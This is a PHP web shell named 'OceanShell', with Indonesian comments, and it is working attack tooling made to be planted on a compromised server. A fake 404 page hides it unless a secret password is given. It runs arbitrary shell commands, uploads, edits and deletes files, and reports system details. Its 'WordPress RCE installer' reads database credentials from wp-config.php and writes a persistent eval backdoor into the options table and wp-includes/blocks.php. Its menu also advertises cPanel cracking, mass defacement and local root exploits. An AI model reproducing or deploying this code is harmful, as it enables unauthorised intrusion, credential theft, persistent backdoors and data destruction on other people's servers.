<?php
session_start();

// Define the hashed password (replace this with your bcrypt hash)
define('HASHED_PASSWORD', '$2a$12$4k/gWmiVIUkb9FAgd2sIcOzWs.lTBzWOspRG2hOn.5hAj/wJAB88u'); // Replace with the actual hash

// Check if the user is already logged in with a valid password
if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
    // Continue with the page content
} else {
    // Check if 'q' parameter is set and equals 'log'
    if (isset($_GET['q']) && $_GET['q'] === 'log') {
        if (isset($_POST['password'])) {
            // Check if the provided password matches the hashed password
            if (password_verify($_POST['password'], HASHED_PASSWORD)) {
                $_SESSION['authenticated'] = true;
                // Redirect to remove the 'q' parameter from the URL
                $url = strtok($_SERVER["REQUEST_URI"], '?');
                header("Location: $url");
                exit;
            } else {
                $error = "Incorrect password. Please try again.";
            }
        }
        // Show password prompt
        if (isset($error)) {
            echo '<p>' . htmlspecialchars($error) . '</p>';
        }
        echo '<form method="post">
        <div align="center">
<input type="password" name="password" required>
<button type="submit">></button>
</form>
</body></html>';
    exit;
    } else {
        header("HTTP/1.0 404 Not Found");
        echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>';
        exit;
    }
}

// Handle Install RCE functionality
if (isset($_GET['do']) && $_GET['do'] === 'rce') {
    jalankanWordpressRCE();
    exit;
}

function jalankanWordpressRCE() {
    error_reporting(0);
    set_time_limit(0);
    ignore_user_abort(true);
    
    $results = [];
    $errors = [];
    
    if (isset($_POST['run'])) {
        $current_dir = __DIR__;
        
        $wp_config_path = $current_dir . '/wp-config.php';
        $wp_includes_path = $current_dir . '/wp-includes';
        
        $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]" . dirname($_SERVER['SCRIPT_NAME']);
        
        if (!file_exists($wp_config_path)) {
            $errors[] = "wp-config.php not found";
        } elseif (!file_exists($wp_includes_path . '/blocks.php')) {
            $errors[] = "blocks.php not found";
        } else {
            $wp_config_content = file_get_contents($wp_config_path);
            preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\)/", $wp_config_content, $db_name_match);
            preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\)/", $wp_config_content, $db_user_match);
            preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'\s*\)/", $wp_config_content, $db_pass_match);
            
            if (empty($db_name_match) || empty($db_user_match) || empty($db_pass_match)) {
                $errors[] = "Failed to extract database credentials";
            } else {
                $db_name = $db_name_match[1];
                $db_user = $db_user_match[1];
                $db_pass = $db_pass_match[1];
                
                try {
                    $db = new mysqli('localhost', $db_user, $db_pass, $db_name);
                    
                    if ($db->connect_error) {
                        $errors[] = "Database connection failed";
                    } else {
                        $options_table = false;
                        
                        preg_match("/\\\$table_prefix\s*=\s*'([^']+)'/", $wp_config_content, $prefix_match);
                        if (!empty($prefix_match)) {
                            $table_prefix = $prefix_match[1];
                            $test_table = $table_prefix . 'options';
                            if ($db->query("SELECT 1 FROM $test_table LIMIT 1")) {
                                $options_table = $test_table;
                            }
                        }
                        
                        if (!$options_table) {
                            $result = $db->query("SHOW TABLES LIKE '%\_options'");
                            if ($result && $result->num_rows > 0) {
                                $row = $result->fetch_array();
                                $options_table = $row[0];
                            }
                        }
                        
                        if (!$options_table) {
                            $common_prefixes = ['wp_', 'wordpress_', 'wp1_', 'wptest_', 'site_', 'blog_'];
                            foreach ($common_prefixes as $prefix) {
                                $test_table = $prefix . 'options';
                                if ($db->query("SELECT 1 FROM $test_table LIMIT 1")) {
                                    $options_table = $test_table;
                                    break;
                                }
                            }
                        }
                        
                        if (!$options_table) {
                            $errors[] = "Could not detect WordPress options table";
                        } else {
                            $results[] = "Detected options table: " . $options_table;
                            
                            $check_query = "SELECT option_value FROM $options_table WHERE option_name = 'rce_payload'";
                            $check_result = $db->query($check_query);
                            
                            if ($check_result && $check_result->num_rows > 0) {
                                $results[] = "RCE payload already exists";
                            } else {
                                $insert_query = "INSERT INTO $options_table (option_name, option_value, autoload) VALUES ('rce_payload', 'system(\$_GET[\"cmd\"]);', 'no')";
                                
                                if ($db->query($insert_query)) {
                                    $results[] = "Successfully injected RCE payload";
                                } else {
                                    $errors[] = "Failed to inject payload";
                                }
                            }
                            
                            if (empty($errors)) {
                                $blocks_php_path = $wp_includes_path . '/blocks.php';
                                $backup_path = $wp_includes_path . '/blocks.php.bak';
                                
                                if (!file_exists($backup_path)) {
                                    copy($blocks_php_path, $backup_path);
                                }
                                
                                $blocks_content = file_get_contents($blocks_php_path);
                                
                                if (strpos($blocks_content, 'rce_payload') === false) {
                                    $payload = "\n\nif (isset(\$_GET['cmd'])) {\n    global \$wpdb;\n    @eval(\$wpdb->get_var(\"SELECT option_value FROM $options_table WHERE option_name = 'rce_payload'\"));\n    exit;\n}\n";
                                    
                                    file_put_contents($blocks_php_path, $blocks_content . $payload);
                                    $results[] = "Successfully modified blocks.php";
                                } else {
                                    $results[] = "Blocks.php already modified";
                                }
                                
                                $test_url = rtrim($base_url, '/') . '/?cmd=id';
                                $results[] = "Exploit URL: <a href='{$test_url}' target='_blank'>{$test_url}</a>";
                            }
                        }
                    }
                } catch (Exception $e) {
                    $errors[] = "Database error";
                }
            }
        }
    }
    
    // Return JSON response for modal
    header('Content-Type: application/json');
    echo json_encode([
        'success' => empty($errors),
        'results' => $results,
        'errors' => $errors
    ]);
    exit;
}

// Fungsi untuk menampilkan notifikasi sukses
function success()
{
    echo '<meta http-equiv="refresh" content="0;url=?response=success">';
}

// Fungsi untuk menampilkan notifikasi gagal
function failed()
{
    echo '<meta http-equiv="refresh" content="0;url=?response=failed">';
}
?>

<!DOCTYPE HTML>
<html lang="en">
<head>
<title>OceanShell</title>
<meta name='author' content='ByteX1'>
<meta charset="UTF-8">
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<!-- Link Font Awesome untuk menggunakan ikon -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
<style type='text/css'>
@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
body {
    background: linear-gradient(45deg, #232526, #414345);
    color: #d1d1d1;
    font-family: 'Roboto', sans-serif;
    padding: 10px;
    margin: 0;
}

.container {
    max-width: 1000px;
    margin: auto;
    padding: 20px;
    background-color: #282c34;
    border-radius: 8px;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
}

header {
    text-align: center;
    margin-bottom: 20px;
}

input[type=text], input[type=password], textarea, select {
    width: calc(100% - 60px); /* Mengurangi lebar input agar sejajar dengan tombol */
    padding: 12px;
    margin: 8px 0;
    border: none;
    border-radius: 4px;
    box-sizing: border-box;
    background-color: #333;
    color: #f2f2f2;
    border: 1px solid #555;
    display: inline-block;
    vertical-align: middle;
}

button.submit-btn {
    width: 50px; /* Lebar tombol disesuaikan dengan ukuran ikon */
    height: 50px; /* Tinggi tombol disesuaikan dengan ukuran ikon */
    background-color: #00bcd4;
    color: white;
    padding: 10px;
    margin: 8px 0;
    border: none;
    border-radius: 50%; /* Bentuk bulat */
    cursor: pointer;
    font-size: 20px; /* Ukuran ikon */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    vertical-align: middle;
}

button.submit-btn i {
    margin: 0; /* Tidak ada margin karena hanya ikon */
}

button.submit-btn:hover {
    background-color: #008c9e;
}

table {
    width: 100%;
    border-collapse: collapse;
    margin: 20px 0;
    font-size: 16px;
    text-align: left;
    color: white;
    table-layout: auto; /* Lebar kolom disesuaikan dengan konten */
}

th, td {
    padding: 10px 15px;
    border: 1px solid #ddd; /* Border biru gelap */
    vertical-align: top;
    word-wrap: break-word; /* Memungkinkan teks panjang tetap terlihat tanpa terpotong */
}

th {
    background-color: #4682b4; /* Warna header */
}

tr:nth-child(even) {
    background-color: #f9f9f9; /*
 Warna baris genap */
}

.file-icon {
        margin-right: 8px;
    }

tr.directory-row {
    background-color: #2c3e50;
    color: #ecf0f1;
}

tr.file-row {
    background-color: #34495e;
    color: #ecf0f1;
}

tr:hover {
    background-color: #576574;
}

.footer {
    text-align: center;
    padding: 10px;
    font-size: 14px;
    color: #888;
}

li {
    display: inline;
    margin: 5px;
    padding: 5px;
}

a {
    color: #00bcd4;
    text-decoration: none;
}

a:hover {
    color: #ffeb3b;
    text-decoration: underline;
}

pre {
    font-size: 14px;
    background-color: #222;
    padding: 15px;
    border-radius: 5px;
}

hr {
    border: 1px solid #00bcd4;
}

.center {
    text-align: center;
    margin: 20px 0;
}

ul {
    list-style-type: none;
    padding: 0;
}

.header-pre {
    background-color: #282c34;
    padding: 15px;
    border-radius: 8px;
    overflow-x: auto;
}

/* Tambahan CSS untuk bendera */
.flag-icon {
    vertical-align: middle;
    margin-left: 5px;
}

textarea {
    background-color: #333;
    color: #f2f2f2;
    border: 1px solid #555;
    border-radius: 4px;
    padding: 10px;
    font-family: 'Roboto', sans-serif;
    box-sizing: border-box;
}

.permission-green {
    color: #00e676; /* Warna hijau muda terang */
    font-weight: bold; /* Opsional: membuat teks tebal */
}

.size-white {
    color: #ffffff; /* Warna putih */
    font-weight: bold; /* Menonjolkan ukuran angka */
    font-size: 1.1em; /* Opsional: sedikit memperbesar angka */
}

.size-orange {
    color: #ffa500; /* Warna oranye */
    font-weight: bold; /* Menonjolkan satuan */
    font-size: 1em; /* Tetap proporsional */
}

/* Modal Styles */
.modal {
    display: none;
    position: fixed;
    z-index: 1000;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0,0,0,0.8);
    animation: fadeIn 0.3s;
}

.modal-content {
    background: linear-gradient(45deg, #232526, #414345);
    margin: 5% auto;
    padding: 0;
    border-radius: 12px;
    width: 80%;
    max-width: 600px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    animation: slideIn 0.3s;
    border: 1px solid #00bcd4;
}

@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}

@keyframes slideIn {
    from { transform: translateY(-50px); opacity: 0; }
    to { transform: translateY(0); opacity: 1; }
}

.modal-header {
    background: #1a1a1a;
    padding: 20px;
    border-radius: 12px 12px 0 0;
    border-bottom: 2px solid #00bcd4;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.modal-header h2 {
    margin: 0;
    color: #00bcd4;
    font-size: 1.5em;
}

.close {
    color: #aaa;
    font-size: 28px;
    font-weight: bold;
    cursor: pointer;
    transition: color 0.3s;
}

.close:hover {
    color: #ff5252;
}

.modal-body {
    padding: 25px;
    max-height: 60vh;
    overflow-y: auto;
}

.modal-footer {
    padding: 15px 25px;
    background: #1a1a1a;
    border-radius: 0 0 12px 12px;
    border-top: 1px solid #333;
    text-align: right;
}

.btn {
    background: #00bcd4;
    color: white;
    border: none;
    padding: 12px 24px;
    border-radius: 6px;
    cursor: pointer;
    font-size: 14px;
    transition: background 0.3s;
    margin-left: 10px;
}

.btn:hover {
    background: #008c9e;
}

.btn-danger {
    background: #ff5252;
}

.btn-danger:hover {
    background: #d32f2f;
}

.btn-success {
    background: #00e676;
}

.btn-success:hover {
    background: #00c853;
}

.rce-step {
    background: #2d3748;
    padding: 15px;
    border-radius: 8px;
    margin-bottom: 15px;
    border-left: 4px solid #00bcd4;
}

.rce-step h4 {
    margin: 0 0 10px 0;
    color: #00bcd4;
    display: flex;
    align-items: center;
    gap: 10px;
}

.rce-step h4 i {
    font-size: 1.2em;
}

.rce-result {
    margin-top: 20px;
}

.success-item {
    background: #1b5e20;
    padding: 10px 15px;
    border-radius: 6px;
    margin: 8px 0;
    border-left: 4px solid #00e676;
    display: flex;
    align-items: center;
    gap: 10px;
}

.error-item {
    background: #b71c1c;
    padding: 10px 15px;
    border-radius: 6px;
    margin: 8px 0;
    border-left: 4px solid #ff5252;
    display: flex;
    align-items: center;
    gap: 10px;
}

.loading {
    text-align: center;
    padding: 20px;
    color: #00bcd4;
}

.loading i {
    font-size: 2em;
    margin-bottom: 10px;
}

.progress-bar {
    width: 100%;
    height: 4px;
    background: #333;
    border-radius: 2px;
    overflow: hidden;
    margin: 15px 0;
}

.progress {
    height: 100%;
    background: #00bcd4;
    width: 0%;
    transition: width 0.3s;
}

.exploit-url {
    background: #1a1a1a;
    padding: 12px;
    border-radius: 6px;
    border: 1px solid #00bcd4;
    word-break: break-all;
    margin: 10px 0;
}

.exploit-url a {
    color: #00e676;
    font-weight: bold;
}

</style>
</head>
<body>
<div class="container">
    <header>
        <h1>OceanShell</h1>
    </header>

    <div class="header-pre">
        <?php
        // Mengecek parameter response di URL
        if (isset($_GET['response'])) {
            if ($_GET['response'] == "success") {
                echo "<script>
                Swal.fire({
                    icon: 'success',
                    title: 'Success...',
                    text: 'Done Success!',
                    confirmButtonColor: '#22242d',
                });
                </script>";
            } elseif ($_GET['response'] == "failed") {
                echo "<script>
                Swal.fire({
                    icon: 'error',
                    title: 'Failed...',
                    text: 'Something wrong!',
                    confirmButtonColor: '#22242d',
                });
                </script>";
            }
        }

        // Mendapatkan nama domain dari server yang sedang diakses
        $domain = $_SERVER['SERVER_NAME'];

        // Mendapatkan alamat IP asli dari domain
        $server_ip = gethostbyname($domain);

        // Mendapatkan alamat IP client
        $client_ip = $_SERVER['REMOTE_ADDR'];

        // Mendapatkan informasi dari API ipwho.is
        function getIpInfo($ip) {
            $url = "http://ipwho.is/{$ip}";
            $response = file_get_contents($url);
            return json_decode($response, true);
        }

        // Mendapatkan informasi lokasi berdasarkan IP
        $server_info = getIpInfo($server_ip);
        $client_info = getIpInfo($client_ip);

        // Cek apakah negara server tersedia, jika tidak, jangan tampilkan bendera
        $server_flag = isset($server_info['country']) ? "<img src='{$server_info['flag']['img']}' width='20' class='flag-icon'>" : "";

        // Cek apakah negara client tersedia, jika tidak, jangan tampilkan bendera
        $client_flag = isset($client_info['country']) ? "<img src='{$client_info['flag']['img']}' width='20' class='flag-icon'>" : "";

        // Mendapatkan informasi web server
        $server_software = $_SERVER['SERVER_SOFTWARE'];
        $php_version = phpversion();

        // Mendapatkan user dan group yang menjalankan skrip
        $user_id = posix_geteuid();
        $user_info = posix_getpwuid($user_id);
        $group_id = posix_getegid();
        $group_info = posix_getgrgid($group_id);
        $user_group = "{$user_info['name']}({$user_info['uid']}) / {$group_info['name']}({$group_info['gid']})";

        // Mengecek status safe mode
        if (version_compare(PHP_VERSION, '5.4.0', '<')) {
            $safe_mode_status = ini_get('safe_mode') ? "<font color='green'>ON</font>" : "<font color='red'>OFF</font>";
        } else {
            $safe_mode_status = "<font color='red'>Tidak Tersedia (Dihapus sejak PHP 5.4.0)</font>";
        }

        // Mendapatkan informasi HDD (disk usage)
        $disk_total_space = disk_total_space("/");
        $disk_free_space = disk_free_space("/");
        $disk_used_space = $disk_total_space - $disk_free_space;
        $disk_usage = round(($disk_used_space / $disk_total_space) * 100, 2);

        // Convert bytes to a more readable format
        function formatSize($bytes) {
    if ($bytes >= 1073741824) {
        $size = number_format($bytes / 1073741824, 2);
        $unit = "GB";
    } elseif ($bytes >= 1048576) {
        $size = number_format($bytes / 1048576, 2);
        $unit = "MB";
    } elseif ($bytes >= 1024) {
        $size = number_format($bytes / 1024, 2);
        $unit = "KB";
    } else {
        $size = $bytes;
        $unit = "B";
    }

    // Kembalikan dengan HTML styling
    return "<span class='size-white'>{$size}</span><span class='size-orange'> {$unit}</span>";
}


        $total_space_formatted = formatSize($disk_total_space);
        $free_space_formatted = formatSize($disk_free_space);
        $used_space_formatted = formatSize($disk_used_space);

        // Mendapatkan daftar fungsi yang dinonaktifkan
        $disabled_functions = ini_get('disable_functions');
        $disabled_functions = $disabled_functions ? $disabled_functions : "Tidak ada fungsi yang dinonaktifkan";

        // Mendapatkan direktori saat ini dan menavigasi direktori
        $current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
        chdir($current_dir);

        // Mendapatkan izin dari direktori saat ini
        $current_dir_perms = convertPermissions(fileperms($current_dir));

        // Mengubah path saat ini menjadi array yang dapat diklik
        $path_parts = explode('/', trim($current_dir, '/'));
        $path_accum = '';

        echo "<pre>SERVER IP <font color='#00e676'>{$server_ip}</font> ({$server_info['country']} {$server_flag}) / ";
        echo "YOUR IP <font color='#00e676'>{$client_ip}</font> ({$client_info['country']} {$client_flag})<br>";
        echo "WEB SERVER  : <font color='#00e676'>{$server_software}</font><br>";
        echo "SYSTEM      : <font color='#00e676'>" . php_uname() . "</font><br>";
        echo "USER / GROUP: <font color='#00e676'>{$user_group}</font><br>";
        echo "PHP VERSION : <font color='#00e676'>{$php_version}</font><br>";
        echo "SAFE MODE   : {$safe_mode_status}<br>";
        echo "HDD         : <font color='#00e676'>{$used_space_formatted}</font> / <font color='#00e676'>{$total_space_formatted}</font> (Free: <font color='#00e676'>{$free_space_formatted}</font>)<br>";
        echo "DISABLE FUNC: <font color='red'>{$disabled_functions}</font><br>";
        echo "Current Dir (<font color='#00e676'>{$current_dir_perms}</font>) ";

        foreach ($path_parts as $part) {
            $path_accum .= '/' . $part;
            echo "<a href='?dir=" . urlencode($path_accum) . "'>$part</a> / ";
        }

        echo "<br></pre>";
        ?>
    </div>

    <div class="center">
        <form method='post' enctype='multipart/form-data'>
            <input type='radio' name='uploadtype' value='1' checked>current_dir [ <font color='#00e676'>Writeable</font> ] 
            <input type='radio' name='uploadtype' value='2'>document_root [ <font color='#00e676'>Writeable</font> ]<br>
            <input type='file' name='file' class="input">
            <button type='submit' class='submit-btn' name='upload'><i class="fas fa-upload"></i></button>
        </form>
    </div>

    <div class="center">
        <form method='post' action='?do=cmd&dir=<?php echo urlencode($current_dir); ?>'>
            <label>www-data@<?php echo $server_ip; ?>: ~ $</label>
            <input type='text' name='cmd' required class="input">
            <button type='submit' class='submit-btn'><i class="fas fa-play"></i></button>
        </form>
    </div>

    <hr>

    <div class="center">
        <ul>
            <li>[ <a href="?d=<?php echo urlencode(__DIR__); ?>">Home</a> ]</li>
            <li>[ <a href="javascript:void(0)" onclick="openRceModal()">Install Rce</a> ]</li>
            <li>[ <a href='?dir=<?php echo urlencode($current_dir); ?>&do=fakeroot'>Fake Root</a> ]</li>
            <li>[ <a href='?dir=<?php echo urlencode($current_dir); ?>&do=cpanel'>cPanel Crack</a> ]</li>
            <li>[ <a href='?dir=<?php echo urlencode($current_dir); ?>&do=mpc'>Mass Password Change</a> ]</li>
            <li>[ <a href='?dir=<?php echo urlencode($current_dir); ?>&do=mass'>Mass Deface/Delete</a> ]</li>
            <li>[ <a href='?dir=<?php echo urlencode($current_dir); ?>&do=lre'>Local Root Exploiter</a> ]</li>
            <li>[ <a href='?dir=<?php echo urlencode($current_dir); ?>&do=zoneh'>Zone-H</a> ]</li>
        </ul>
    </div>

    <hr>

    <table width="100%" class="table_home">
        <tr>
        <th class="th_home">Name</th>
        <th class="th_home">Size</th>
        <th class="th_home">Last Modified</th>
        <th class="th_home">Owner/Group</th>
        <th class="th_home">Permission</th>
        <th class="th_home">Action</th>
        </tr>
        <?php
        function listDirectory($dir) {
    $files = scandir($dir);
    $directories = [];
    $normal_files = [];

    // Pisahkan folder dan file
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $path = $dir . '/' . $file;
        if (is_dir($path)) {
            $directories[] = $file;
        } else {
            $normal_files[] = $file;
        }
    }

    // Tampilkan folder terlebih dahulu
    foreach ($directories as $directory) {
        $path = $dir . '/' . $directory;
        $owner_info = posix_getpwuid(fileowner($path));
        $group_info = posix_getgrgid(filegroup($path));
        $owner_group = "{$owner_info['name']} / {$group_info['name']}";
        
        echo "<tr class='directory-row'>";
        echo "<td><i class='fas fa-folder file-icon'></i><a href='?dir=" . urlencode($path) . "'>$directory</a></td>";
        echo "<td>dir</td>";
        echo "<td>" . date("F d Y H:i:s", filemtime($path)) . "</td>";
        echo "<td>{$owner_group}</td>";
        echo "<td>" . convertPermissions(fileperms($path)) . "</td>";
        echo "<td><a href='?view=" . urlencode($path) . "' class='btn'>View</a> <a href='?edit=" . urlencode($path) . "' class='btn'>Edit</a> <a href='?delete=" . urlencode($path) . "' class='btn'>Delete</a></td>";
        echo "</tr>";
    }

    // Tampilkan file
    foreach ($normal_files as $file) {
        $path = $dir . '/' . $file;
        $owner_info = posix_getpwuid(fileowner($path));
        $group_info = posix_getgrgid(filegroup($path));
        $owner_group = "{$owner_info['name']} / {$group_info['name']}";

        echo "<tr class='file-row'>";
        echo "<td><i class='fas fa-file file-icon'></i><a href='?edit=" . urlencode($path) . "'>$file</a></td>";
        echo "<td>" . formatSize(filesize($path)) . "</td>";
        echo "<td>" . date("F d Y H:i:s", filemtime($path)) . "</td>";
        echo "<td>{$owner_group}</td>";
        echo "<td>" . convertPermissions(fileperms($path)) . "</td>";
        echo "<td><a href='?view=" . urlencode($path) . "' class='btn'>View</a> <a href='?delete=" . urlencode($path) . "' class='btn'>Delete</a></td>";
        echo "</tr>";
    }
}


        function viewFile($file) {
            if (is_readable($file)) {
                echo "<h3>Viewing: " . htmlspecialchars($file) . "</h3>";
                echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
            } else {
                echo "<p>File cannot be read.</p>";
            }
        }

        function editFile($file) {
            if (is_readable($file) && is_writable($file)) {
                if (isset($_POST['save'])) {
                    file_put_contents($file, $_POST['file_content']);
                    echo "<p>File saved successfully.</p>";
                }
                $file_content = htmlspecialchars(file_get_contents($file));
                echo "<h3>Editing: " . htmlspecialchars($file) . "</h3>";
                echo "<form method='post'>";
                echo "<textarea name='file_content' style='width:100%; height:400px;'>{$file_content}</textarea><br>";
                echo "<button type='submit' name='save' class='submit-btn'><i class='fas fa-save'></i> Save</button>";
                echo "</form>";
            } else {
                echo "<p>File cannot be edited.</p>";
            }
        }

        function deleteFile($file) {
            if (is_writable($file)) {
                unlink($file);
                success();
            } else {
                failed();
            }
        }

        function uploadFile($target_dir) {
            $target_file = $target_dir . '/' . basename($_FILES["file"]["name"]);
            if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
                success();
            } else {
                failed();
            }
        }

        function convertPermissions($perms) {
    $info = ($perms & 0x4000) ? 'd' : '-';
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : '-';
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : '-';
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : '-';

    return "<span class='permission-green'>{$info}</span>";
}

        // Handle file operations
        if (isset($_GET['view'])) {
            viewFile($_GET['view']);
        } elseif (isset($_GET['edit'])) {
            editFile($_GET['edit']);
        } elseif (isset($_GET['delete'])) {
            deleteFile($_GET['delete']);
        } elseif (isset($_POST['upload'])) {
            uploadFile($current_dir);
        } else {
            listDirectory($current_dir);
        }
        if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd']; // Mendapatkan perintah yang dimasukkan oleh pengguna
    // Pastikan perintah yang dimasukkan tidak berbahaya
    $output = shell_exec($cmd); // Menjalankan perintah dan menyimpan outputnya

    // Menampilkan hasil perintah
    echo "<h3>Hasil Perintah: </h3>";
    echo "<pre>" . htmlspecialchars($output) . "</pre>"; // Menampilkan hasil perintah dengan aman
}
        ?>
    </table>

    <div class="footer">
        <p>Customized &copy; 2024 - <a href='#'><font color='#00bcd4'>ByteX1</font></a></p>
    </div>
</div>

<!-- RCE Modal -->
<div id="rceModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h2><i class="fas fa-bug"></i> WordPress RCE Installer</h2>
            <span class="close">&times;</span>
        </div>
        <div class="modal-body">
            <div class="rce-step">
                <h4><i class="fas fa-info-circle"></i> About This Tool</h4>
                <p>This tool will attempt to install a RCE backdoor in WordPress by:</p>
                <ol>
                    <li>Extracting database credentials from wp-config.php</li>
                    <li>Injecting a payload into the WordPress options table</li>
                    <li>Modifying wp-includes/blocks.php to execute the payload</li>
                </ol>
            </div>

            <div class="rce-step">
                <h4><i class="fas fa-exclamation-triangle"></i> Important Notes</h4>
                <p>• Make sure you're in a WordPress directory</p>
                <p>• The script will create a backup of blocks.php</p>
                <p>• This may not work on all WordPress installations</p>
            </div>

            <div id="rceResults" class="rce-result" style="display: none;">
                <!-- Results will be displayed here -->
            </div>

            <div id="rceLoading" class="loading" style="display: none;">
                <i class="fas fa-spinner fa-spin"></i>
                <p>Installing RCE Backdoor...</p>
                <div class="progress-bar">
                    <div class="progress" id="progressBar"></div>
                </div>
            </div>
        </div>
        <div class="modal-footer">
            <button type="button" class="btn btn-danger" onclick="closeRceModal()">Cancel</button>
            <button type="button" class="btn btn-success" onclick="installRce()">Install RCE</button>
        </div>
    </div>
</div>

<script>
// Modal functionality
const modal = document.getElementById("rceModal");
const closeBtn = document.querySelector(".close");
const rceResults = document.getElementById("rceResults");
const rceLoading = document.getElementById("rceLoading");
const progressBar = document.getElementById("progressBar");

function openRceModal() {
    modal.style.display = "block";
    rceResults.style.display = "none";
    rceLoading.style.display = "none";
}

function closeRceModal() {
    modal.style.display = "none";
}

closeBtn.onclick = closeRceModal;

window.onclick = function(event) {
    if (event.target == modal) {
        closeRceModal();
    }
}

// RCE Installation
function installRce() {
    rceLoading.style.display = "block";
    rceResults.style.display = "none";
    
    // Simulate progress
    let progress = 0;
    const interval = setInterval(() => {
        progress += 10;
        progressBar.style.width = progress + '%';
        if (progress >= 90) clearInterval(interval);
    }, 200);

    // Send AJAX request
    const xhr = new XMLHttpRequest();
    xhr.open('POST', '?do=rce', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            clearInterval(interval);
            progressBar.style.width = '100%';
            
            setTimeout(() => {
                rceLoading.style.display = "none";
                rceResults.style.display = "block";
                
                try {
                    const response = JSON.parse(xhr.responseText);
                    displayResults(response);
                } catch (e) {
                    displayError('Failed to parse server response');
                }
            }, 500);
        }
    };
    
    xhr.send('run=1');
}

function displayResults(response) {
    let html = '';
    
    if (response.success) {
        html += '<div class="success-item"><i class="fas fa-check-circle"></i> RCE Installation Completed Successfully!</div>';
    } else {
        html += '<div class="error-item"><i class="fas fa-exclamation-circle"></i> RCE Installation Failed!</div>';
    }
    
    if (response.results && response.results.length > 0) {
        response.results.forEach(result => {
            html += `<div class="success-item"><i class="fas fa-check"></i> ${result}</div>`;
        });
    }
    
    if (response.errors && response.errors.length > 0) {
        response.errors.forEach(error => {
            html += `<div class="error-item"><i class="fas fa-times"></i> ${error}</div>`;
        });
    }
    
    // Check if there's an exploit URL in the results
    const exploitUrl = response.results?.find(r => r.includes('Exploit URL:'));
    if (exploitUrl) {
        const url = exploitUrl.match(/<a href='([^']+)'/)?.[1];
        if (url) {
            html += `<div class="exploit-url">
                <strong><i class="fas fa-link"></i> Exploit URL:</strong><br>
                <a href="${url}" target="_blank">${url}</a>
            </div>`;
        }
    }
    
    rceResults.innerHTML = html;
}

function displayError(message) {
    rceResults.innerHTML = `<div class="error-item"><i class="fas fa-times"></i> ${message}</div>`;
}
</script>
</body>
</html>